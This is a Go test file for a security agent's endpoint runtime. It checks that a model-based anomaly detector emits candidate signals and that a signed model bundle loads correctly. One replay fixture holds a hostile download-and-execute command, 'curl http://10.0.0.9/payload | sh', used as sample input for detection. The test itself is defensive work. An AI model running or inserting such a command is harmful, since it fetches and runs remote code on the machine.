package runtime

import (
	"crypto/ed25519"
	"os"
	"path/filepath"
	"testing"

	"github.com/sysarmor/sysarmor-next-project/apps/agent/internal/adapters/config"
	detectionadapter "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/adapters/detection"
	eventadapter "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/adapters/sensor/tetragon"
	telemetryadapter "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/adapters/telemetry"
	domaindetection "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/domain/detection"
	domainprocess "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/domain/process"
	sensorv1 "github.com/sysarmor/sysarmor-next-project/packages/contracts/proto/sensor/v1"
	signalv1 "github.com/sysarmor/sysarmor-next-project/packages/contracts/proto/signal/v1"
	"github.com/sysarmor/sysarmor-next-project/packages/sensor-sdk/contract"
)

func TestEndpointRuntimeIncludesLearningCandidateInDataBatch(t *testing.T) {
	runner := &Coordinator{Config: config.Config{Agent: config.AgentConfig{ID: "agent-a", HostID: "host-a", TenantID: "tenant-a"}}}
	runner.wireComponents()
	normalizer := newTestEventNormalizer(t, runner, "agent-a", "host-a", eventadapter.EventNormalizerOptions{TenantID: "tenant-a", ScopeType: "host"})
	learning := &learningDetectorStub{signal: &domaindetection.Signal{
		ID: "model-signal-a", Name: "model_anomaly", Where: domaindetection.SignalWhereEndpoint,
		Stage: domaindetection.SignalStageCandidate, DetectorKind: domaindetection.DetectorKindModel,
		ModelRef: "model:profile-v2", ModelVersion: "2", ModelDigest: "sha256:test", FeatureSchema: "FeatureSchemaV2",
	}}
	runtime := NewEndpointRuntime(
		&runner.policyState,
		normalizer,
		telemetryadapter.NewBatchBuilder(&runner.telemetryState, 0),
		learning,
		runner.processProfiles,
	)

	batch, err := runtime.ProcessEvent(sensorEventEnvelope("process.exec", 101, "/usr/bin/bash", "", ""))
	if err != nil {
		t.Fatal(err)
	}
	if len(batch.GetEvents()) != 1 || len(batch.GetSignals()) != 1 {
		t.Fatalf("batch = %+v", batch)
	}
	signal := batch.GetSignals()[0].GetSignal()
	if signal.GetStage() != signalv1.SignalStage_SIGNAL_STAGE_CANDIDATE || signal.GetDetectorKind() != signalv1.DetectorKind_DETECTOR_KIND_MODEL {
		t.Fatalf("signal classification = %+v", signal)
	}
	if signal.GetModelRef() != "model:profile-v2" || signal.GetFeatureSchema() != "FeatureSchemaV2" {
		t.Fatalf("signal provenance = %+v", signal)
	}
	if learning.profile.StableID == "" || learning.profile.Revision != 1 {
		t.Fatalf("learning detector profile = %+v", learning.profile)
	}
}

func TestEndpointRuntimeReplaysCollectedModelBundle(t *testing.T) {
	modelPath := filepath.Join("..", "..", "..", "..", "..", "test", "data", "learning", "model-bundle.json")
	raw, err := os.ReadFile(modelPath)
	if err != nil {
		t.Fatal(err)
	}
	publicKey, privateKey, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}
	signed, err := detectionadapter.SignModelBundle(raw, "release-test", privateKey)
	if err != nil {
		t.Fatal(err)
	}
	modelPath = filepath.Join(t.TempDir(), "model.json")
	if err := os.WriteFile(modelPath, signed, 0o600); err != nil {
		t.Fatal(err)
	}
	learning, err := detectionadapter.LoadModelBundle(modelPath, map[string]ed25519.PublicKey{"release-test": publicKey})
	if err != nil {
		t.Fatal(err)
	}
	runner := &Coordinator{Config: config.Config{Agent: config.AgentConfig{ID: "agent-a", HostID: "host-a", TenantID: "tenant-a"}}}
	runner.wireComponents()
	normalizer := newTestEventNormalizer(t, runner, "agent-a", "host-a", eventadapter.EventNormalizerOptions{TenantID: "tenant-a", ScopeType: "host"})
	runtime := NewEndpointRuntime(&runner.policyState, normalizer, telemetryadapter.NewBatchBuilder(&runner.telemetryState, 0), learning, runner.processProfiles)

	exec := &sensorv1.RawProcess{
		Pid: 9001, Binary: "/bin/bash", Uid: 0, StartTimeNs: 1,
		Argv: []string{"bash", "-c", "curl http://10.0.0.9/payload | sh", "--no-profile", "--debug"},
	}
	if _, err := runtime.ProcessEvent(contract.EventEnvelope{SensorEvent: &sensorv1.SensorEvent{
		Behavior: "process.exec", RawRef: "replay-anomaly",
		Proc: exec,
	}}); err != nil {
		t.Fatal(err)
	}
	batch, err := runtime.ProcessEvent(contract.EventEnvelope{SensorEvent: &sensorv1.SensorEvent{
		Behavior: "network.connect", RawRef: "replay-network", Proc: exec,
		Object: &sensorv1.RawObject{Dst: "10.0.0.9:443"},
	}})
	if err != nil {
		t.Fatal(err)
	}
	if len(batch.GetSignals()) != 1 {
		t.Fatalf("signals = %+v", batch.GetSignals())
	}
	signal := batch.GetSignals()[0].GetSignal()
	if signal.GetDetectorKind() != signalv1.DetectorKind_DETECTOR_KIND_MODEL || signal.GetStage() != signalv1.SignalStage_SIGNAL_STAGE_CANDIDATE {
		t.Fatalf("signal classification = %+v", signal)
	}
	if signal.GetModelRef() != "model:process-profile-v2" || signal.GetModelVersion() != "2" || signal.GetModelDigest() == "" || signal.GetFeatureSchema() != "FeatureSchemaV2" {
		t.Fatalf("signal provenance = %+v", signal)
	}
	if len(signal.GetEventRefs()) != 2 || signal.GetEventRefs()[1] != batch.GetEvents()[0].GetEvent().GetId() {
		t.Fatalf("event refs = %v", signal.GetEventRefs())
	}
}

type learningDetectorStub struct {
	profile domainprocess.Snapshot
	signal  *domaindetection.Signal
}

func (detector *learningDetectorStub) Process(profile domainprocess.Snapshot) []*domaindetection.Signal {
	detector.profile = profile
	return []*domaindetection.Signal{detector.signal}
}
